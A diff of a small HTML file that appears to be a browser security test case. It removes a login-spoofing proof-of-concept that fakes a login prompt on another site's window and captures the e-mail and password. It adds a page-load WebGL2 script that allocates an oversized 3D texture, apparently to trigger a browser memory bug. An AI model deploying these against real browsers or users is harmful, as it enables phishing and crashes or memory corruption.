@@ -1,7 +1,21 @@
+<body onload="start()">
+<canvas id='gl' width='1' height='1' />
 <script>
-function go(){
-var x=window.open('https://www.example.com/?q=www.facebook.com');
-setTimeout(function(){x.document.body.innerHTML='<h1>Please login</h1>';a=x.prompt('E-mail','');b=x.prompt('Password','');alert('E-mail: '+a+'\nPassword: '+b)},3000);
+function web(gl) {
+var handle = gl.createTexture();
+gl.bindTexture(gl.TEXTURE_3D, handle);
+const width = 0xc2;
+const height = 0x541;
+const depth = 0x404;
+const src = new Float32Array(0x10);
+gl.texStorage3D(gl.TEXTURE_3D, 1, gl.RGBA32F, width, height, depth);
+gl.texSubImage3D(gl.TEXTURE_3D, 0, 0, 0, 0, 1, 1, 1, gl.RGBA, gl.FLOAT, src);
 }
-</script>
-<button onclick="go()">go</button>
+function start() {
+var canvas = document.getElementById('gl');
+var gl = canvas.getContext('webgl2');
+if (gl) {
+web(gl);
+}
+}
+</script><head>
